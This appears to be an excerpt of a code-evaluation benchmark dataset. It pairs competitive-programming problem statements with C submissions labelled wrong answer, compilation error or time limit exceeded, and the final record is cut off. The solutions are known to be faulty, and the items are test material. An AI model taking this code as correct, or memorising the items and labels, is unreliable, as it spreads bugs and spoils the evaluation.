{"difficulty":1900,"lang":"GNU C","lang_cluster":"c","src_uid":"bc8b4b74c2f2d486e2d2f03982ef1013","submission_id":"re_1402","tags":["two pointers","dsu","data structures","binary search","trees"],"exec_outcome":"WRONG_ANSWER","source_code":"#include <stdio.h>\n#include <unistd.h>\n#include <stdlib.h>\n#include <string.h>\n#include <inttypes.h>\n\ntypedef uint8_t byte;\ntypedef uint16_t u16;\ntypedef uint32_t u32;\ntypedef int32_t s32;\ntypedef uint64_t u64;\n\n#ifdef DEBUG\n#  define debug(...) ({fprintf(stderr,__VA_ARGS__);fflush(stderr);})\n#else\n#  define NDEBUG\n#  define debug(...)\n#endif\n\nint main(void)\n{\n\tu32 N,K;\n\tscanf(\"%u %u\",&N,&K);\n\tu32 *n = malloc(sizeof(*n) * N);\n\tfor(u32 i = 0;i < N;i++)\n\t\tscanf(\" %u\",&n[i]);\n\tu32 (*m)[N] = malloc(sizeof(*m) * N);;\n\ts32 a = 0,b = 0,c = 0,d = 0;\n\tm[0][0] = n[0];\n\tm[1][0] = n[0];\n\tu32 (*h)[2] = malloc(sizeof(*h) * N),i = 0,j = 0,k = 0,x = 1;\n\tdo\n\t{\n\t\tdo\n\t\t{\n\t\t\tif(++j == N)\n\t\t\t\tbreak;\n\t\t\twhile(a <= b && m[0][b] < n[j])\n\t\t\t\t--b;\n\t\t\tm[0][++b] = n[j];\n\t\t\twhile(c <= d && m[1][d] > n[j])\n\t\t\t\t--d;\n\t\t\tm[1][++d] = n[j];\n\t\t\tdebug(\"a%u %u %u %u\\n\",i,j,m[0][b],m[1][c]);\n\t\t}\n\t\twhile(m[0][a] - m[1][c] <= K);\n\t\tdebug(\"a%u %u %u %u\\n\",i,j,m[0][b],m[1][c]);\n\t\tif(j - i > x)\n\t\t{\n\t\t\tx = j - i;\n\t\t\tk = 0;\n\t\t}\n\t\tif(j - i == x)\n\t\t{\n\t\t\th[k][0] = i + 1;\n\t\t\th[k][1] = j;\n\t\t\tk++;\n\t\t}\n\t\tif(j == N)\n\t\t\tbreak;\n\t\tdo\n\t\t{\n\t\t\tif(m[0][a] == n[i])\n\t\t\t\t++a;\n\t\t\tif(m[1][c] == n[i])\n\t\t\t\t++c;\n\t\t\t++i;\n\t\t}\n\t\twhile(m[0][a] - m[1][c] > K);\n\t}\n\twhile(1);\n\tprintf(\"%u %u\\n\",x,k);\n\tfor(u32 i = 0;i < k;i++)\n\t\tprintf(\"%u %u\\n\",h[i][0],h[i][1]);\n\treturn 0;\n}\n\n\/* inspired by Andy Pham *\/\n","description":"There are several days left before the fiftieth birthday of a famous Berland's writer Berlbury. In this connection the local library decided to make an exposition of the works of this famous science-fiction writer. It was decided as well that it is necessary to include into the exposition only those books that were published during a particular time period. It is obvious that if the books differ much in size, the visitors will not like it. That was why the organizers came to the opinion, that the difference between the highest and the lowest books in the exposition should be not more than k millimeters.The library has n volumes of books by Berlbury, arranged in chronological order of their appearance. The height of each book in millimeters is know, it is hi. As Berlbury is highly respected in the city, the organizers want to include into the exposition as many books as possible, and to find out what periods of his creative work they will manage to cover. You are asked to help the organizers cope with this hard task.","input_from":"standard input","output_to":"standard output","input_spec":"The first line of the input data contains two integer numbers separated by a space n (1\u2009\u2264\u2009n\u2009\u2264\u2009105) and k (0\u2009\u2264\u2009k\u2009\u2264\u2009106) \u2014 the amount of books by Berlbury in the library, and the maximum allowed height difference between the lowest and the highest books. The second line contains n integer numbers separated by a space. Each number hi (1\u2009\u2264\u2009hi\u2009\u2264\u2009106) is the height of the i-th book in millimeters.","output_spec":"In the first line of the output data print two numbers a and b (separate them by a space), where a is the maximum amount of books the organizers can include into the exposition, and b \u2014 the amount of the time periods, during which Berlbury published a books, and the height difference between the lowest and the highest among these books is not more than k milllimeters. In each of the following b lines print two integer numbers separated by a space \u2014 indexes of the first and the last volumes from each of the required time periods of Berlbury's creative work.","notes":null,"sample_inputs":["3 3\n14 12 10","2 0\n10 10","4 5\n8 19 10 13"],"sample_outputs":["2 2\n1 2\n2 3","2 1\n1 2","2 1\n3 4"]}
{"difficulty":1800,"lang":"GNU C","lang_cluster":"c","src_uid":"bfbd7a73e65d240ee7e8c83cc68ca0a1","submission_id":"re_1137","tags":["math"],"exec_outcome":"WRONG_ANSWER","source_code":"#include <stdio.h>\n#include <stdlib.h>\n\nint main(){\n\tregister int i;\n\tint n;\n\tint k;\n\tscanf(\"%d\",&n);\n\tint mas[n+1];\n\tint nmas[n+1];\n\tfor (i=0;i<n;i++)\n\t\tscanf(\"%d\",&mas[i]);\n\tfloat a,aa,amin,amax;\n\tmas[n]=0;\n\tnmas[n]=0;\n\ta=mas[0];\n\tamin=a;\n\tamax=100;\n\tif (mas[0]>99)\n\t\tamax=1000000;\n\tif (n<400)\n\t\tk=200;\n\telse\n\t\tk=1000000;\n\tint d=0;\n\tfloat mina,maxa;\n\twhile (d<200){\n\t\ta=(amax+amin)\/2;\n\t\tfor (i=0;i<n;i++)\n\t\t\tnmas[i]=(int)(i+1)*a;\n\t\tfor (i=0;i<n;i++){\n\t\t\tif (nmas[i]>mas[i]){\n\t\t\t\tamax=a;\n\t\t\t\ti=n;\n\/\/\t\t\t\tprintf(\"n>m %d a=%f\\n\",nmas[i],a);\n\t\t\t}\n\t\t\tif (nmas[i]<mas[i]){\n\t\t\t\tamin=a;\n\t\t\t\ti=n;\n\/\/\t\t\t\tprintf(\"n<m %d a=%f\\n\",nmas[i],a);\n\t\t\t}\n\t\t}\n\t\td++;\n\t}\n\/\/\tprintf(\"\\n%f n+1 = %f\\n\",a,a*(n+1));\n\taa=a;\n\tamin=1;\n\tamax=a;\n\td=0;\n\twhile (d<k){\n\t\ta=(amax+amin)\/2;\n\t\tfor (i=0;i<n;i++)\n\t\t\tnmas[i]=(int)(i+1)*a;\n\t\tfor (i=0;i<n;i++){\n\t\t\tif (nmas[i]>mas[i]){\n\t\t\t\tamax=a;\n\t\t\t\ti=n;\n\/\/\t\t\t\tprintf(\"n>m %d a=%f\\n\",nmas[i],a);\n\t\t\t}\n\t\t\tif (nmas[i]<mas[i]){\n\t\t\t\tamin=a;\n\t\t\t\ti=n;\n\/\/\t\t\t\tprintf(\"n<m %d a=%f\\n\",nmas[i],a);\n\t\t\t}\n\t\t}\n\t\td++;\n\t}\n\tmina=a;\n\/\/\tprintf(\"\\n%f n+1 = %f\\n\",a,a*(n+1));\n\ta=aa;\n\tamin=a;\n\tamax=100;\n\tif (mas[0]>99)\n\t\tamax=1000000;\n\td=0;\n\twhile (d<k){\n\t\ta=(amax+amin)\/2;\n\t\tfor (i=0;i<n;i++)\n\t\t\tnmas[i]=(int)(i+1)*a;\n\t\tfor (i=0;i<n;i++){\n\t\t\tif (nmas[i]>mas[i]){\n\t\t\t\tamax=a;\n\t\t\t\ti=n;\n\/\/\t\t\t\tprintf(\"n>m %d a=%f\\n\",nmas[i],a);\n\t\t\t}\n\t\t\tif (nmas[i]<mas[i]){\n\t\t\t\tamin=a;\n\t\t\t\ti=n;\n\/\/\t\t\t\tprintf(\"n<m %d a=%f\\n\",nmas[i],a);\n\t\t\t}\n\t\t}\n\t\td++;\n\t}\n\tmaxa=a;\n\/\/\tprintf(\"\\n%f n+1 = %f\\n\",a,a*(n+1));\n\t\n\tint ntmin,ntmax;\n\tntmin=(int)(mina*(n+1));\n\tntmax=(int)(maxa*(n+1));\n\tif (ntmin==ntmax)\n\t\tprintf(\"unique\\n%i\",ntmin);\n\telse\n\t\tprintf(\"not unique\");\n\n\t\n\/\/\tfor (i=0;i<n;i++)\n\/\/\t\tprintf(\"%d \",nmas[i]);\n\treturn 0;\n}\n","description":"Every year a race takes place on the motorway between cities A and B. This year Vanya decided to take part in the race and drive his own car that has been around and bears its own noble name \u2014 The Huff-puffer.So, Vasya leaves city A on the Huff-puffer, besides, at the very beginning he fills the petrol tank with \u03b1 liters of petrol (\u03b1\u2009\u2265\u200910 is Vanya's favorite number, it is not necessarily integer). Petrol stations are located on the motorway at an interval of 100 kilometers, i.e. the first station is located 100 kilometers away from the city A, the second one is 200 kilometers away from the city A, the third one is 300 kilometers away from the city A and so on. The Huff-puffer spends 10 liters of petrol every 100 kilometers. Vanya checks the petrol tank every time he passes by a petrol station. If the petrol left in the tank is not enough to get to the next station, Vanya fills the tank with \u03b1 liters of petrol. Otherwise, he doesn't stop at the station and drives on. For example, if \u03b1\u2009=\u200943.21, then the car will be fuelled up for the first time at the station number 4, when there'll be 3.21 petrol liters left. After the fuelling up the car will have 46.42 liters. Then Vanya stops at the station number 8 and ends up with 6.42\u2009+\u200943.21\u2009=\u200949.63 liters. The next stop is at the station number 12, 9.63\u2009+\u200943.21\u2009=\u200952.84. The next stop is at the station number 17 and so on. You won't believe this but the Huff-puffer has been leading in the race! Perhaps it is due to unexpected snow. Perhaps it is due to video cameras that have been installed along the motorway which register speed limit breaking. Perhaps it is due to the fact that Vanya threatened to junk the Huff-puffer unless the car wins. Whatever the reason is, the Huff-puffer is leading, and jealous people together with other contestants wrack their brains trying to think of a way to stop that outrage.One way to do this is to mine the next petrol station where Vanya will stop. Your task is to calculate at which station this will happen and warn Vanya. You don't know the \u03b1 number, however, you are given the succession of the numbers of the stations where Vanya has stopped. Find the number of the station where the next stop will be.","input_from":"standard input","output_to":"standard output","input_spec":"The first line contains an integer n (1\u2009\u2264\u2009n\u2009\u2264\u20091000) which represents the number of petrol stations where Vanya has stopped. The next line has n space-separated integers which represent the numbers of the stations. The numbers are positive and do not exceed 106, they are given in the increasing order. No two numbers in the succession match. It is guaranteed that there exists at least one number \u03b1\u2009\u2265\u200910, to which such a succession of stops corresponds.","output_spec":"Print in the first line \"unique\" (without quotes) if the answer can be determined uniquely. In the second line print the number of the station where the next stop will take place. If the answer is not unique, print in the first line \"not unique\".","notes":"NoteIn the second example the answer is not unique. For example, if \u03b1\u2009=\u200910, we'll have such a sequence as 1, 2, 3, and if \u03b1\u2009=\u200914, the sequence will be 1, 2, 4.","sample_inputs":["3\n1 2 4","2\n1 2"],"sample_outputs":["unique\n5","not unique"]}
{"difficulty":1900,"lang":"GNU C","lang_cluster":"c","src_uid":"c16c49baf7b2d179764871204475036e","submission_id":"re_1182","tags":["dp","implementation"],"exec_outcome":"COMPILATION_ERROR","source_code":"#include<cstdio>\n#include<cstdlib>\n#include<cstring>\n\n#define MOD 1000000007\n\nstruct xx\n{\n    int z,of,or,t,m;\n}a[2];\n\nchar str[1000005];\n\nint main()\n{\n    int i;\n    int l,n;\n    int len;\n    int ans;\n    scanf(\"%s\",str);\n    len=strlen(str);\n    l=0;\n    if(str[0]=='?')\n        a[0].m=a[0].or=a[0].z=1;\n    else if(str[0]=='*')\n        a[0].m=1;\n    else if(str[0]=='0')\n        a[0].z=1;\n    else if(str[0]=='1')\n        a[0].or=1;\n    for(i=1;i<len;i++)\n    {\n        n=l^1;\n        if(str[i]=='?')\n        {\n            a[n].m=((a[l].m+a[l].t)%MOD+a[l].or)%MOD;\n            a[n].of=a[l].m;\n            a[n].or=(a[l].of+a[l].z)%MOD;\n            a[n].t=a[l].m;\n            a[n].z=(a[l].of+a[l].z)%MOD;\n        }\n        else if(str[i]=='0')\n        {\n            memset(&a[n],0,sizeof(a[n]));\n            a[n].z=(a[l].of+a[l].z)%MOD;\n        }\n        else if(str[i]=='1')\n        {\n            memset(&a[n],0,sizeof(a[n]));\n            a[n].of=a[l].m;\n            a[n].or=(a[l].of+a[l].z)%MOD;\n        }\n        else if(str[i]=='2')\n        {\n            memset(&a[n],0,sizeof(a[n]));\n            a[n].t=a[l].m;\n        }\n        else \n        {\n            memset(&a[n],0,sizeof(a[n]));\n            a[n].m=((a[l].m+a[l].or)%MOD+a[l].t)%MOD;\n        }\n        l=n;\n    }\n    ans=0;\n    ans=(ans+a[l].m)%MOD;\n    ans=(ans+a[l].of)%MOD;\n    ans=(ans+a[l].z)%MOD;\n    printf(\"%d\\n\",ans);\n \/\/   system(\"pause\");\n    return 0;\n}","description":"Game \"Minesweeper 1D\" is played on a line of squares, the line's height is 1 square, the line's width is n squares. Some of the squares contain bombs. If a square doesn't contain a bomb, then it contains a number from 0 to 2 \u2014 the total number of bombs in adjacent squares.For example, the correct field to play looks like that: 001*2***101*. The cells that are marked with \"*\" contain bombs. Note that on the correct field the numbers represent the number of bombs in adjacent cells. For example, field 2* is not correct, because cell with value 2 must have two adjacent cells with bombs.Valera wants to make a correct field to play \"Minesweeper 1D\". He has already painted a squared field with width of n cells, put several bombs on the field and wrote numbers into some cells. Now he wonders how many ways to fill the remaining cells with bombs and numbers are there if we should get a correct field in the end.","input_from":"standard input","output_to":"standard output","input_spec":"The first line contains sequence of characters without spaces s1s2... sn (1\u2009\u2264\u2009n\u2009\u2264\u2009106), containing only characters \"*\", \"?\" and digits \"0\", \"1\" or \"2\". If character si equals \"*\", then the i-th cell of the field contains a bomb. If character si equals \"?\", then Valera hasn't yet decided what to put in the i-th cell. Character si, that is equal to a digit, represents the digit written in the i-th square.","output_spec":"Print a single integer \u2014 the number of ways Valera can fill the empty cells and get a correct field. As the answer can be rather large, print it modulo 1000000007 (109\u2009+\u20097).","notes":"NoteIn the first test sample you can get the following correct fields: 001**1, 001***, 001*2*, 001*10.","sample_inputs":["?01???","?","**12","1"],"sample_outputs":["4","2","0","0"]}
{"difficulty":1700,"lang":"GNU C","lang_cluster":"c","src_uid":"c175d010d75c391d0b25391fecff007c","submission_id":"re_1235","tags":["implementation","greedy","brute force"],"exec_outcome":"WRONG_ANSWER","source_code":"#include <math.h>\n#include <stdio.h>\n\n#define MAX_N 1000\n#define DIGITS_NUMBER 4\n\nint n;\nint y[MAX_N + 1];\nint z[MAX_N + 1];\n\nint arr_to_number_with_replaced_digit(int year_digits[4], int replace_digit, int replace_digit_index) {\n\tint i;\n\tint tens = 1000;\n\tint number = 0;\n\t\n\tfor (i = 0; i < 4; i++) {\n\t\tif (i != replace_digit_index) {\n\t\t\tnumber += year_digits[i] * tens;\n\t\t} else {\n\t\t\tnumber += replace_digit * tens;\n\t\t}\n\t\ttens \/= 10;\n\t}\n\t\n\treturn number;\n}\n\nint calc_max_year(int curr_year, int prev_calc_year) {\n\tif (curr_year == prev_calc_year) {\n\t\treturn curr_year;\n\t}\n\t\n\tint i;\n\tint curr_calc_year = 0;\n\tint max_calc_year = -1;\n\tint curr_year_digits[4];\n\tint prev_calc_year_digits[4];\n\t\n\tint tens = 1000;\n\tint tens_inc = 10;\n\tcurr_year_digits[0] = curr_year \/ 1000;\n\tcurr_year_digits[1] = (curr_year \/ 100) % 10;\n\tcurr_year_digits[2] = (curr_year \/ 10) % 10;\n\tcurr_year_digits[3] = curr_year % 10;\n\tprev_calc_year_digits[0] = prev_calc_year \/ 1000;\n\tprev_calc_year_digits[1] = (prev_calc_year \/ 100) % 10;\n\tprev_calc_year_digits[2] = (prev_calc_year \/ 10) % 10;\n\tprev_calc_year_digits[3] = prev_calc_year % 10;\n\t\n\tfor (i = 0; i < DIGITS_NUMBER; i++) {\n\t\tint digit = 0;\n\t\t\n\t\twhile (digit <= prev_calc_year_digits[i]) {\n\t\t\tcurr_calc_year = arr_to_number_with_replaced_digit(curr_year_digits, digit, i);\n\t\t\t\n\t\t\tif (max_calc_year < curr_calc_year && curr_calc_year <= prev_calc_year) {\n\t\t\t\tmax_calc_year = curr_calc_year;\n\t\t\t}\n\t\t\t\n\t\t\tdigit++;\n\t\t}\n\t\t\n\t\ttens \/= 10;\n\t}\n\t\n\treturn max_calc_year;\n}\n\nint main(void) {\n\tint i;\n\t\n\tscanf(\"%d\", &n);\n\tfor (i = 0; i < n; i++) {\n\t\tscanf(\"%d\", &y[i]);\n\t}\n\t\n\ty[n] = 2011;\n\tz[n] = 2011;\n\tfor (i = n - 1; i >= 0; i--) {\n\t\tz[i] = calc_max_year(y[i], z[i + 1]);\n\t\tif (z[i] == -1 || z[i] < 1000) {\n\t\t\tprintf(\"No solution\\n\");\n\t\t\treturn 0;\n\t\t}\n\t}\n\t\n\tfor (i = 0; i < n; i++) {\n\t\tprintf(\"%d\\n\", z[i]);\n\t}\n\tprintf(\"\\n\");\n\t\n\treturn 0;\n}\n\n\t\/*\n\tif (curr_year \/ 1000 == 2 && prev_calc_year \/ 1000 == 2) {\n\t\tif (prev_calc_year \/ 1000 == 2) {\n\t\t\tif (curr_year \/ 100 > 20) {\n\t\t\t\tif (curr_year % 100 <= prev_calc_year % 100) {\n\t\t\t\t\tcurr_calc_year = 2000 + curr_year % 100;\n\t\t\t\t} else {\n\t\t\t\t\tcurr_calc_year = 1000 + (curr_year % 1000);\n\t\t\t\t}\n\t\t\t} else if (curr_year \/ 100 == 20) {\n\t\t\t\tif (curr_year % 100 < 2 && prev_calc_year > 2009 && curr_year % 10 <= prev_calc_year % 10) {\n\t\t\t\t\tcurr_calc_year = 2010 + curr_year % 10;\n\t\t\t\t} else if (curr_year % 10 < 2 && curr_year < prev_calc_year) {\n\t\t\t\t\tcurr_calc_year = curr_year + (curr_year % 2);\n\t\t\t\t} else {\n\t\t\t\t\tcurr_calc_year = curr_year;\n\t\t\t\t} \/\/ 2000 2010\n\t\t\t} else {\n\t\t\t\tcurr_calc_year = 1000 + (curr_year % 1000);\n\t\t\t}\n\t\t} else {\n\t\t\tcurr_calc_year = 1000 + (curr_year % 1000);\n\t\t}\n\t} else if (curr_year > 2999 || curr_year < 1000) {\n\t\tcurr_calc_year = 1000 + (curr_year % 1000);\n\t} else if (curr_year \/ 1000 == 1 && prev_calc_year \/ 1000 == 2 &&  (curr_year % 1000) <= (prev_calc_year % 1000)) {\n\t\tcurr_calc_year = 2000 + (curr_year % 1000);\n\t} else if (curr_year \/ 1000 == 2 && \n\t*\/\n","description":"The History of Magic is perhaps the most boring subject in the Hogwarts school of Witchcraft and Wizardry. Harry Potter is usually asleep during history lessons, and his magical quill writes the lectures for him. Professor Binns, the history of magic teacher, lectures in such a boring and monotonous voice, that he has a soporific effect even on the quill. That's why the quill often makes mistakes, especially in dates.So, at the end of the semester Professor Binns decided to collect the students' parchments with notes and check them. Ron Weasley is in a panic: Harry's notes may contain errors, but at least he has some notes, whereas Ron does not have any. Ronald also has been sleeping during the lectures and his quill had been eaten by his rat Scabbers. Hermione Granger refused to give Ron her notes, because, in her opinion, everyone should learn on their own. Therefore, Ron has no choice but to copy Harry's notes.Due to the quill's errors Harry's dates are absolutely confused: the years of goblin rebellions and other important events for the wizarding world do not follow in order, and sometimes even dates from the future occur. Now Ron wants to change some of the digits while he copies the notes so that the dates were in the chronological (i.e. non-decreasing) order and so that the notes did not have any dates strictly later than 2011, or strictly before than 1000. To make the resulting sequence as close as possible to the one dictated by Professor Binns, Ron will change no more than one digit in each date into other digit. Help him do it.","input_from":"standard input","output_to":"standard output","input_spec":"The first input line contains an integer n (1\u2009\u2264\u2009n\u2009\u2264\u20091000). It represents the number of dates in Harry's notes. Next n lines contain the actual dates y1, y2, ..., yn, each line contains a date. Each date is a four-digit integer (1000\u2009\u2264\u2009yi\u2009\u2264\u20099999).","output_spec":"Print n numbers z1, z2, ..., zn (1000\u2009\u2264\u2009zi\u2009\u2264\u20092011). They are Ron's resulting dates. Print each number on a single line. Numbers zi must form the non-decreasing sequence. Each number zi should differ from the corresponding date yi in no more than one digit. It is not allowed to change the first digit of a number into 0. If there are several possible solutions, print any of them. If there's no solution, print \"No solution\" (without the quotes).","notes":null,"sample_inputs":["3\n1875\n1936\n1721","4\n9999\n2000\n3000\n3011","3\n1999\n5055\n2000"],"sample_outputs":["1835\n1836\n1921","1999\n2000\n2000\n2011","No solution"]}
{"difficulty":2600,"lang":"GNU C","lang_cluster":"c","src_uid":"c23d3ec2b9fb4b4d169bc8053bfd000e","submission_id":"re_1454","tags":["dp","implementation","expression parsing"],"exec_outcome":"TIME_LIMIT_EXCEEDED","source_code":"#include <ctype.h>\n#include <stdio.h>\n#include <string.h>\n\n#define N\t100\n#define M\t100000\n\nvoid trim(char *s) {\n\tstatic char t[128];\n\tint n, m, i;\n\n\tmemset(t, 0, sizeof t);\n\tn = strlen(s);\n\tfor (i = 0, m = 0; i < n; i++)\n\t\tif (!isspace(s[i]))\n\t\t\tt[m++] = s[i];\n\tstrcpy(s, t);\n}\n\nint isop(char c) {\n\treturn c == '[' || c == ']' || c == '(' || c == ')' || c == '+' || c == '-' || c == '*' || c == '\/';\n}\n\nint xx[M], yy[M];\n\nint replace(char *ss, char *s, char *t, int x) {\n\tstatic char s_[M + 1];\n\tint n, m, l, n_, i, change;\n\n\tn = strlen(ss);\n\tm = strlen(s);\n\tl = strlen(t);\n\tmemset(s_, 0, sizeof s_);\n\tn_ = 0;\n\tchange = 0;\n\tmemset(xx, 0, sizeof xx);\n\tfor (i = 0; i < n; )\n\t\tif (i + m <= n && strncmp(ss + i, s, m) == 0 && (i == 0 || isop(ss[i - 1])) && (i + m == n || isop(ss[i + m]))) {\n\t\t\txx[n_] = x;\n\t\t\ts_[n_++] = '[';\n\t\t\tmemcpy(s_ + n_, t, l);\n\t\t\tn_ += l;\n\t\t\ts_[n_++] = ']';\n\t\t\ti += m;\n\t\t\tchange = 1;\n\t\t} else {\n\t\t\txx[n_] = yy[i];\n\t\t\ts_[n_++] = ss[i++];\n\t\t}\n\tstrcpy(ss, s_);\n\tmemset(yy, 0, sizeof yy);\n\tmemcpy(yy, xx, n_ * sizeof *xx);\n\treturn change;\n}\n\nstatic char t1[N][128], t2[N][128];\nstatic char aa[N + 1], bb[N + 1], cc[N + 1];\nint n;\n\nvoid parse(char *ss, int x) {\n\tstatic int stack[M];\n\tint m, i, j, j_, x_, cnt, cnt_;\n\n\taa[x] = 1;\n\tmemset(yy, 0, sizeof yy);\n\tfor (i = 0; i < x; i++)\n\t\tif (replace(ss, t1[i], t2[i], i) && !aa[i]) {\n\t\t\taa[x] = bb[x] = cc[x] = 0;\n\t\t\treturn;\n\t\t}\n\tbb[x] = cc[x] = 0;\n\tm = strlen(ss);\n\tfor (j = 0, cnt = 0, cnt_ = 0; j < m; j++) {\n\t\tif (ss[j] == '[')\n\t\t\tstack[cnt++] = j;\n\t\telse if (ss[j] == ']') {\n\t\t\tj_ = stack[--cnt], x_ = xx[j_];\n\t\t\tif (j_ > 0) {\n\t\t\t\tif ((ss[j_ - 1] == '*' || ss[j_ - 1] == '\/') && bb[x_]) {\n\t\t\t\t\taa[x] = bb[x] = cc[x] = 0;\n\t\t\t\t\treturn;\n\t\t\t\t}\n\t\t\t\tif (ss[j_ - 1] == '-' && bb[x_]) {\n\t\t\t\t\taa[x] = bb[x] = cc[x] = 0;\n\t\t\t\t\treturn;\n\t\t\t\t}\n\t\t\t\tif (ss[j_ - 1] == '\/' && cc[x_]) {\n\t\t\t\t\taa[x] = bb[x] = cc[x] = 0;\n\t\t\t\t\treturn;\n\t\t\t\t}\n\t\t\t}\n\t\t\tif (j + 1 < m && (ss[j + 1] == '*' || ss[j + 1] == '\/') && bb[x_]) {\n\t\t\t\taa[x] = bb[x] = cc[x] = 0;\n\t\t\t\treturn;\n\t\t\t}\n\t\t\tif (bb[x_] && cnt_ == 0)\n\t\t\t\tbb[x] = 1;\n\t\t\tif (cc[x_] && cnt_ == 0)\n\t\t\t\tcc[x] = 1;\n\t\t}\n\t\tif ((ss[j] == '+' || ss[j] == '-') && cnt_ == 0)\n\t\t\tbb[x] = 1;\n\t\telse if ((ss[j] == '*' || ss[j] == '\/') && cnt_ == 0)\n\t\t\tcc[x] = 1;\n\t\tif (ss[j] == '(')\n\t\t\tcnt_++;\n\t\telse if (ss[j] == ')')\n\t\t\tcnt_--;\n\t}\n}\n\nint main() {\n\tstatic char ss[M + 2], tt[M + 2], s[128];\n\tint i, len;\n\n\tscanf(\"%d\", &n);\n\tfor (i = 0; i < n; i++) {\n\t\tlen = 0;\n\t\twhile (len < 7) {\n\t\t\tscanf(\"%s\", s);\n\t\t\tlen += strlen(s);\n\t\t}\n\t\tscanf(\"%s\", t1[i]);\n\t\tfgets(t2[i], 128, stdin);\n\t\ttrim(t2[i]);\n\t}\n\tfgets(ss, M + 2, stdin);\n\ttrim(ss);\n\tfor (i = 0; i <= n; i++) {\n\t\tstrcpy(tt, i < n ? t2[i] : ss);\n\t\tparse(tt, i);\n\t\tprintf(\"%d %d %d\\n\", aa[i], bb[i], cc[i]);\n\t}\n\tprintf(aa[n] ? \"OK\\n\" : \"Suspicious\\n\");\n\treturn 0;\n}\n","description":"Most C\/C++ programmers know about excellent opportunities that preprocessor #define directives give; but many know as well about the problems that can arise because of their careless use.In this problem we consider the following model of #define constructions (also called macros). Each macro has its name and value. The generic syntax for declaring a macro is the following:#define macro_name macro_valueAfter the macro has been declared, \"macro_name\" is replaced with \"macro_value\" each time it is met in the program (only the whole tokens can be replaced; i.e. \"macro_name\" is replaced only when it is surrounded by spaces or other non-alphabetic symbol). A \"macro_value\" within our model can only be an arithmetic expression consisting of variables, four arithmetic operations, brackets, and also the names of previously declared macros (in this case replacement is performed sequentially). The process of replacing macros with their values is called substitution.One of the main problems arising while using macros \u2014 the situation when as a result of substitution we get an arithmetic expression with the changed order of calculation because of different priorities of the operations.Let's consider the following example. Say, we declared such a #define construction:#define sum x + yand further in the program the expression \"2 * sum\" is calculated. After macro substitution is performed we get \"2 * x + y\", instead of intuitively expected \"2 * (x + y)\".Let's call the situation \"suspicious\", if after the macro substitution the order of calculation changes, falling outside the bounds of some macro. Thus, your task is to find out by the given set of #define definitions and the given expression if this expression is suspicious or not.Let's speak more formally. We should perform an ordinary macros substitution in the given expression. Moreover, we should perform a \"safe\" macros substitution in the expression, putting in brackets each macro value; after this, guided by arithmetic rules of brackets expansion, we can omit some of the brackets. If there exist a way to get an expression, absolutely coinciding with the expression that is the result of an ordinary substitution (character-by-character, but ignoring spaces), then this expression and the macros system are called correct, otherwise \u2014 suspicious.Note that we consider the \"\/\" operation as the usual mathematical division, not the integer division like in C\/C++. That's why, for example, in the expression \"a*(b\/c)\" we can omit brackets to get the expression \"a*b\/c\".","input_from":"standard input","output_to":"standard output","input_spec":"The first line contains the only number n (0\u2009\u2264\u2009n\u2009\u2264\u2009100) \u2014 the amount of #define constructions in the given program. Then there follow n lines, each of them contains just one #define construction. Each construction has the following syntax: #define name expression where   name \u2014 the macro name,  expression \u2014 the expression with which the given macro will be replaced. An expression is a non-empty string, containing digits,names of variables, names of previously declared macros, round brackets and operational signs +-*\/. It is guaranteed that the expression (before and after macros substitution) is a correct arithmetic expression, having no unary operations. The expression contains only non-negative integers, not exceeding 109.  All the names (#define constructions' names and names of their arguments) are strings of case-sensitive Latin characters. It is guaranteed that the name of any variable is different from any #define construction. Then, the last line contains an expression that you are to check. This expression is non-empty and satisfies the same limitations as the expressions in #define constructions. The input lines may contain any number of spaces anywhere, providing these spaces do not break the word \"define\" or the names of constructions and variables. In particular, there can be any number of spaces before and after the \"#\" symbol. The length of any line from the input file does not exceed 100 characters.","output_spec":"Output \"OK\", if the expression is correct according to the above given criterion, otherwise output \"Suspicious\".","notes":null,"sample_inputs":["1\n#define sum x + y\n1 * sum","1\n#define sum  (x + y)\nsum - sum","4\n#define sum  x + y\n#define mul  a * b\n#define div  a \/ b\n#define expr sum + mul * div * mul\nexpr","3\n#define SumSafe   (a+b)\n#define DivUnsafe  a\/b\n#define DenominatorUnsafe  a*b\n((SumSafe) + DivUnsafe\/DivUnsafe + x\/DenominatorUnsafe)"],"sample_outputs":["Suspicious","OK","OK","Suspicious"]}
{"difficulty":1600,"lang":"GNU C11","lang_cluster":"c","src_uid":"c4b7265ff4332225c0d5617c3233a910","submission_id":"re_1323","tags":["dsu","dfs and similar","graphs"],"exec_outcome":"WRONG_ANSWER","source_code":"#include <stdio.h>\n#include <math.h>\n#include <stdlib.h>\n#include <string.h>\n\nint koncni [110];\nint fab [110][110];\n\nint main(){\n\n\tint n;\n\tscanf(\"%d\", &n);\n\n\tfor(int i = 1; i <= n; i++){\n\t\tscanf(\"%d\", &koncni[i]);\n\t}\n\n\tint a;\n\tint b;\n\n\tfor (int i = 1; i <=n; i++){\n\t\tscanf(\"%d\",&a);\n\n\t\tif (i - a >= 1){\n\t\t\tfab[i][i - a] = 1;\n\t\t\tfab[i - a][i] = 1;\n\t\t}\n\t\tif (a + i <= n){\n\t\t\tfab[i][i + a] = 1;\n\t\t\tfab[i + a][i] = 1;\n\t\t}\n\n\t}\n\t\/\/int je;\n\n\tfor (int i = 1; i <= n; i++ ){\n\t\tfor (int j = 1; j <= n; j++){\n\t\t\tfor (int z = 1; z <= n; z++){\n\t\t\t\tif ((fab[i][z] && fab[z][j])||\n\t\t\t\t\t fab[i][z] && fab [j][z]){\n\n\n\t\t\t\t\tfab[i][j] = 1;\n\t\t\t\t\tfab[j][i] = 1;\n\t\t\t\t}\n\t\t\t}\n\t\t}\n\t}\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\tint gor = 0;\n\tint levo = 0;\n\n\n\tfor (int i = 1; i <= n; i++){\n\t\tfab[i][i] = 1;\n\t}\n\tint je = 1;\n\n\tfor (int i = 1; i <= n; i++){\n\t\tif (fab[i][koncni[i]]==0){\n\t\t\tje = 0;\n\t\t\tbreak;\n\t\t}\n\n\n\t}\n\n\tif (je == 1){\n\t\tprintf(\"YES\");\n\t}\n\telse{\n\t\tprintf(\"NO\");\n\t}\n\n\n\tprintf(\"\\n\");\n\n\tfor (int i = 1; i <= 7; i++){\n\t\tfor (int j = 1; j <= 7 ; j++ ){\n\t\t\tprintf(\"%d \",fab[i][j] );\n\t\t}\n\t\tprintf(\"\\n\");\n\t}\n\n\n\n\t\t\n\n\n\n\treturn 0;\n}","description":"One day n cells of some array decided to play the following game. Initially each cell contains a number which is equal to it's ordinal number (starting from 1). Also each cell determined it's favourite number. On it's move i-th cell can exchange it's value with the value of some other j-th cell, if 